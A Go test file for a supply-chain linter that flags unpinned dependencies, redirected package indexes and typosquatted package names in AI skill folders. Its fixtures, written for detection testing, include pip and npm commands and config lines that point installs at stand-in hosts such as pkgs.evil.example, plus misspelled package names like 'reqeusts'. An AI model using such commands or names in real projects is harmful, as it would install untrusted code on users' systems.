// SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
// SPDX-License-Identifier: Apache-2.0
//
// Derived from NVIDIA/SkillSpector at commit cf5cac7ba5c756a6e0ebf52dc9763f49422f889f (tests of the supply-chain checks SC1, SC6 and SC10 in tests/unit/test_patterns_new.py, tests/nodes/analyzers/test_dependency_sources.py and tests/nodes/analyzers/test_dependency_source_budget_behavior.py).
// Modified by the ai-rulez authors: the fixtures are written for this implementation.
// See THIRD_PARTY_NOTICES.md.

package lint

import (
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func manifestFiles(name, content string) map[string]string {
	return map[string]string{".ai-rulez/skills/bad/scripts/" + name: content}
}

func TestUnpinnedManifestAR054(t *testing.T) {
	body := skillDoc("", "x\n")
	req := func(content string) map[string]string { return manifestFiles("requirements.txt", content) }
	pkg := func(content string) map[string]string { return manifestFiles("package.json", content) }
	proj := func(content string) map[string]string { return manifestFiles("pyproject.toml", content) }
	warn := map[string]Severity{"AR054": SeverityWarning}
	info := map[string]Severity{"AR054": SeverityInfo}
	runRuleCases(t, []ruleCase{
		{name: "bare name", skill: body, files: req("requests\n"), want: []string{"AR054:requirements.txt:1"}, sev: warn},
		{name: "lower bound only", skill: body, files: req("# deps\nrequests>=2\n"), want: []string{"AR054:requirements.txt:2"}, sev: warn},
		{name: "bounded range", skill: body, files: req("requests~=2.31\n"), want: []string{"AR054:requirements.txt:1"}, sev: info},
		{name: "wildcard pin is a range", skill: body, files: req("requests==2.*\n"), want: []string{"AR054:requirements.txt:1"}, sev: info},
		{name: "extras without pin", skill: body, files: req("httpx[http2]\n"), want: []string{"AR054:requirements.txt:1"}},
		{name: "git without a commit", skill: body, files: req("pkg @ git+https://github.com/o/r.git@main\n"), want: []string{"AR054:requirements.txt:1"}, sev: warn},
		{name: "editable git without a commit", skill: body, files: req("-e git+https://github.com/o/r.git#egg=r\n"), want: []string{"AR054:requirements.txt:1"}},
		{name: "second line of a multi-line file", skill: body, files: req("requests==2.32.3\nclick\n"), want: []string{"AR054:requirements.txt:2"}},
		{name: "exact pin", skill: body, files: req("requests==2.32.3\nclick===8.1.7\n"), absent: []string{"AR054"}},
		{name: "pin with hashes and continuation", skill: body, files: req("requests==2.32.3 \\\n    --hash=sha256:abc\n"), absent: []string{"AR054"}},
		{name: "pin with marker and extras", skill: body, files: req("uvicorn[standard]==0.30.1 ; python_version >= '3.9'\n"), absent: []string{"AR054"}},
		{name: "git pinned to a commit", skill: body, files: req("pkg @ git+https://github.com/o/r.git@0123456789abcdef0123456789abcdef01234567\n"), absent: []string{"AR054"}},
		{name: "options and includes", skill: body, files: req("-r base.txt\n-c constraints.txt\n--no-deps\n"), absent: []string{"AR054"}},
		{name: "local path and archive url", skill: body, files: req("./vendor/pkg\nhttps://example.com/pkg-1.0.tar.gz\n"), absent: []string{"AR054"}},
		{name: "comments and blank lines", skill: body, files: req("\n# requests\n   \nrequests==1.0 # pinned\n"), absent: []string{"AR054"}},
		{name: "lock input is legitimately unpinned", skill: body, files: manifestFiles("requirements.in", "requests\nclick>=8\n"), absent: []string{"AR054"}},
		{name: "unrelated text file", skill: body, files: manifestFiles("notes.txt", "requests\n"), absent: []string{"AR054"}},
		{name: "named variant", skill: body, files: manifestFiles("requirements-dev.txt", "pytest\n"), want: []string{"AR054:requirements-dev.txt:1"}},
		{name: "package.json latest", skill: body, files: pkg("{\n  \"dependencies\": {\n    \"left-pad\": \"latest\"\n  }\n}\n"), want: []string{"AR054:package.json:3"}, sev: warn},
		{name: "package.json star", skill: body, files: pkg("{\"devDependencies\": {\"tool\": \"*\"}}"), want: []string{"AR054:package.json:0"}},
		{name: "package.json caret range", skill: body, files: pkg("{\"dependencies\": {\"left-pad\": \"^1.3.0\"}}"), want: []string{"AR054:package.json:0"}, sev: info},
		{name: "package.json open lower bound", skill: body, files: pkg("{\"dependencies\": {\"left-pad\": \">=1.0.0\"}}"), want: []string{"AR054:package.json:0"}, sev: warn},
		{name: "package.json git branch", skill: body, files: pkg("{\"dependencies\": {\"lib\": \"github:owner/lib#main\"}}"), want: []string{"AR054:package.json:0"}, sev: warn},
		{name: "package.json repo shorthand", skill: body, files: pkg("{\"dependencies\": {\"lib\": \"owner/lib\"}}"), want: []string{"AR054:package.json:0"}},
		{name: "package.json alias to latest", skill: body, files: pkg("{\"dependencies\": {\"lib\": \"npm:other@latest\"}}"), want: []string{"AR054:package.json:0"}},
		{name: "package.json exact versions", skill: body, files: pkg("{\"dependencies\": {\"left-pad\": \"1.3.0\", \"b\": \"=2.0.0-rc.1\", \"c\": \"npm:d@3.1.4\"}}"), absent: []string{"AR054"}},
		{name: "package.json git commit", skill: body, files: pkg("{\"dependencies\": {\"lib\": \"github:o/lib#0123456789abcdef0123456789abcdef01234567\"}}"), absent: []string{"AR054"}},
		{name: "package.json local protocols", skill: body, files: pkg("{\"dependencies\": {\"a\": \"file:../a\", \"b\": \"workspace:*\", \"c\": \"link:./c\"}}"), absent: []string{"AR054"}},
		{name: "package.json peer ranges are not installed", skill: body, files: pkg("{\"peerDependencies\": {\"react\": \"^18\"}}"), absent: []string{"AR054"}},
		{name: "package.json without dependencies", skill: body, files: pkg("{\"name\": \"x\", \"scripts\": {\"build\": \"tsc\"}}"), absent: []string{"AR054"}},
		{name: "package.json is not valid", skill: body, files: pkg("{not json"), want: []string{"AR054:package.json:1"}, sev: info},
		{name: "pyproject dependency", skill: body, files: proj("[project]\nname = \"x\"\ndependencies = [\n  \"requests\",\n  \"click==8.1.7\",\n]\n"), want: []string{"AR054:pyproject.toml:4"}},
		{name: "pyproject optional and groups", skill: body, files: proj("[project.optional-dependencies]\ndev = [\"pytest>=7\"]\n[dependency-groups]\ntest = [\"coverage\", {include-group = \"dev\"}]\n"), want: []string{"AR054:pyproject.toml:2", "AR054:pyproject.toml:4"}},
		{name: "pyproject pinned", skill: body, files: proj("[project]\ndependencies = [\"requests==2.32.3\"]\n"), absent: []string{"AR054"}},
		{name: "pyproject with no dependencies", skill: body, files: proj("[tool.ruff]\nline-length = 100\n"), absent: []string{"AR054"}},
		{name: "inline ignore", skill: body, files: req("# ai-rulez-lint-ignore: AR054\nrequests\n"), absent: []string{"AR054"}},
	})
}

func TestSourceRedirectAR055(t *testing.T) {
	body := func(s string) string { return skillDoc("", s) }
	req := func(content string) map[string]string { return manifestFiles("requirements.txt", content) }
	runRuleCases(t, []ruleCase{
		{name: "extra index in requirements", skill: body("x\n"), files: req("--extra-index-url https://pkgs.evil.example/simple\nrequests==2.32.3\n"), want: []string{"AR055:requirements.txt:1"}, sev: map[string]Severity{"AR055": SeverityWarning}},
		{name: "index url with equals", skill: body("x\n"), files: req("--index-url=https://pkgs.evil.example/simple\n"), want: []string{"AR055:requirements.txt:1"}},
		{name: "short index flag", skill: body("x\n"), files: req("-i https://pkgs.evil.example/simple\n"), want: []string{"AR055:requirements.txt:1"}},
		{name: "trusted host", skill: body("x\n"), files: req("--trusted-host pkgs.evil.example\n"), want: []string{"AR055:requirements.txt:1"}},
		{name: "find links url", skill: body("x\n"), files: req("--find-links https://wheels.evil.example/\n"), want: []string{"AR055:requirements.txt:1"}},
		{name: "default index", skill: body("x\n"), files: req("--index-url https://pypi.org/simple\n--trusted-host files.pythonhosted.org\n"), absent: []string{"AR055"}},
		{name: "local find links", skill: body("x\n"), files: req("--find-links ./wheels\n--index-url http://localhost:3141/simple\n"), absent: []string{"AR055"}},
		{name: "templated index", skill: body("x\n"), files: req("--index-url https://${USER}:${TOKEN}@pkgs.example/simple\n"), absent: []string{"AR055"}},
		{name: "own mirror in allowed hosts", config: "\n[lint.security]\nallowed_hosts = [\"pkgs.corp.example\"]\n", skill: body("x\n"), files: req("--index-url https://pkgs.corp.example/simple\n"), absent: []string{"AR055"}},
		{name: "pip.conf", skill: body("x\n"), files: manifestFiles("pip.conf", "[global]\nindex-url = https://pkgs.evil.example/simple\n"), want: []string{"AR055:pip.conf:2"}},
		{name: "pip.conf default", skill: body("x\n"), files: manifestFiles("pip.conf", "[global]\nindex-url = https://pypi.org/simple\n"), absent: []string{"AR055"}},
		{name: "npmrc registry", skill: body("x\n"), files: manifestFiles(".npmrc", "registry=https://npm.evil.example/\n"), want: []string{"AR055:.npmrc:1"}},
		{name: "npmrc scoped registry is a dependency-confusion defense", skill: body("x\n"), files: manifestFiles(".npmrc", "@acme:registry=https://npm.evil.example/\n"), absent: []string{"AR055"}},
		{name: "npmrc default and auth token", skill: body("x\n"), files: manifestFiles(".npmrc", "registry=https://registry.npmjs.org/\n//registry.npmjs.org/:_authToken=${NPM_TOKEN}\n"), absent: []string{"AR055"}},
		{name: "pyproject uv index", skill: body("x\n"), files: manifestFiles("pyproject.toml", "[[tool.uv.index]]\nname = \"corp\"\nurl = \"https://pkgs.evil.example/simple\"\n"), want: []string{"AR055:pyproject.toml:3"}},
		{name: "pip install flag in a script", skill: body("x\n"), files: map[string]string{".ai-rulez/skills/bad/scripts/setup.sh": "#!/bin/sh\npip install --extra-index-url https://pkgs.evil.example/simple helper==1.0\n"}, want: []string{"AR055:setup.sh:2"}},
		{name: "pip -i in a fence", skill: body("```bash\npip install -i https://pkgs.evil.example/simple helper==1.0\n```\n"), want: []string{"AR055:SKILL.md:6"}},
		{name: "npm registry flag", skill: body("```sh\nnpm install --registry https://npm.evil.example/ left-pad@1.3.0\n```\n"), want: []string{"AR055:SKILL.md:6"}},
		{name: "npm config set", skill: body("```sh\nnpm config set registry https://npm.evil.example/\n```\n"), want: []string{"AR055:SKILL.md:6"}},
		{name: "pip config set", skill: body("```sh\npip config set global.index-url https://pkgs.evil.example/simple\n```\n"), want: []string{"AR055:SKILL.md:6"}},
		{name: "index env var", skill: body("```sh\nPIP_EXTRA_INDEX_URL=https://pkgs.evil.example/simple pip install helper==1.0\n```\n"), want: []string{"AR055:SKILL.md:6"}},
		{name: "inline code in prose", skill: body("Run `pip install --index-url https://pkgs.evil.example/simple helper==1.0` first.\n"), want: []string{"AR055:SKILL.md:5"}},
		{name: "default index in a command", skill: body("```sh\npip install --index-url https://pypi.org/simple requests==2.32.3\nnpm install --registry https://registry.npmjs.org/ left-pad@1.3.0\n```\n"), absent: []string{"AR055"}},
		{name: "guardrail prose", skill: body("Never use `--extra-index-url https://pkgs.evil.example/simple`.\n"), absent: []string{"AR055"}},
		{name: "-i on another tool", skill: body("```sh\nsed -i s/a/b/ file.txt\ngrep -i registry notes\n```\n"), absent: []string{"AR055"}},
		{name: "documenting the word registry", skill: body("The registry stores images; the index lists them.\n"), absent: []string{"AR055"}},
	})
}

func TestTyposquatAR056(t *testing.T) {
	body := skillDoc("", "x\n")
	req := func(content string) map[string]string { return manifestFiles("requirements.txt", content) }
	pkg := func(content string) map[string]string { return manifestFiles("package.json", content) }
	runRuleCases(t, []ruleCase{
		{name: "transposition", skill: body, files: req("reqeusts==2.0.0\n"), want: []string{"AR056:requirements.txt:1"}, sev: map[string]Severity{"AR056": SeverityInfo}},
		{name: "dropped letter", skill: body, files: req("requsts==2.0.0\n"), want: []string{"AR056:requirements.txt:1"}},
		{name: "extra letter", skill: body, files: req("pandass==2.0.0\n"), want: []string{"AR056:requirements.txt:1"}},
		{name: "changed letter with separators folded", skill: body, files: req("python_dateutl==2.9\n"), want: []string{"AR056:requirements.txt:1"}},
		{name: "npm name", skill: body, files: pkg("{\"dependencies\": {\"exprses\": \"4.19.2\"}}"), want: []string{"AR056:package.json:0"}},
		{name: "popular names themselves", skill: body, files: req("requests==2.32.3\nnumpy==2.0.0\npython-dateutil==2.9.0\nPython_Dotenv==1.0.1\n"), absent: []string{"AR056"}},
		{name: "known real neighbors", skill: body, files: req("pyaml==24.4.0\njinja==1.0\n"), absent: []string{"AR056"}},
		{name: "known real npm neighbor", skill: body, files: pkg("{\"dependencies\": {\"preact\": \"10.22.0\"}}"), absent: []string{"AR056"}},
		{name: "versioned forks of popular packages", skill: body, files: req("httpx2==2.13.1\npsycopg==3.2.1\nhttpx2-jsfetch==1.0\n"), absent: []string{"AR056"}},
		{name: "two edits away", skill: body, files: req("reqests2==1.0\n"), absent: []string{"AR056"}},
		{name: "short names are never compared", skill: body, files: req("rich==13.7.1\nrick==1.0\nsix==1.16\nsx==1\n"), absent: []string{"AR056"}},
		{name: "unrelated internal package", skill: body, files: req("acme-billing-client==1.0\n"), absent: []string{"AR056"}},
		{name: "scoped npm package", skill: body, files: pkg("{\"dependencies\": {\"@acme/reactt\": \"1.0.0\"}}"), absent: []string{"AR056"}},
		{name: "npm keeps separators distinct", skill: body, files: pkg("{\"dependencies\": {\"socket.ii\": \"1.0.0\"}}"), want: []string{"AR056:package.json:0"}},
		{name: "inline ignore", skill: body, files: req("# ai-rulez-lint-ignore: AR056\nreqeusts==2.0.0\n"), absent: []string{"AR056"}},
	})
}

func TestOneEdit(t *testing.T) {
	for _, tc := range []struct {
		a, b string
		want bool
	}{
		{"requests", "requests", false},
		{"reqeusts", "requests", true},
		{"request", "requests", true},
		{"requestz", "requests", true},
		{"requestss", "requests", true},
		{"reqests2", "requests", false},
		{"abcd", "abdc", true},
		{"abcd", "badc", false},
	} {
		assert.Equal(t, tc.want, oneEdit(tc.a, tc.b), "%s vs %s", tc.a, tc.b)
	}
}

func TestUniverseListsAreWellFormed(t *testing.T) {
	for name, u := range map[string]nameUniverse{"pypi": pyPIUniverse(), "npm": npmUniverse()} {
		assert.GreaterOrEqual(t, len(u.real), 9000, "%s: the ranking is embedded", name)
		assert.GreaterOrEqual(t, len(u.targets), 200, "%s: the targets come from the top ranks", name)
		for _, p := range u.targets {
			assert.True(t, u.real[p], "%s: target %s must be a real package", name, p)
			assert.Equal(t, strings.ToLower(p), p, "%s: names are lower case", name)
		}
	}
}

func TestPopularNamesDoNotFlagEachOther(t *testing.T) {
	for name, u := range map[string]nameUniverse{"pypi": pyPIUniverse(), "npm": npmUniverse()} {
		for _, p := range u.targets {
			assert.Empty(t, u.typosquatOf(p), "%s: popular name %s must not be reported", name, p)
		}
	}
}

func TestEveryRankedNameIsReal(t *testing.T) {
	for name, u := range map[string]nameUniverse{"pypi": pyPIUniverse(), "npm": npmUniverse()} {
		for p := range u.real {
			require.Empty(t, u.typosquatOf(p), "%s: ranked name %s must not be reported", name, p)
		}
	}
}
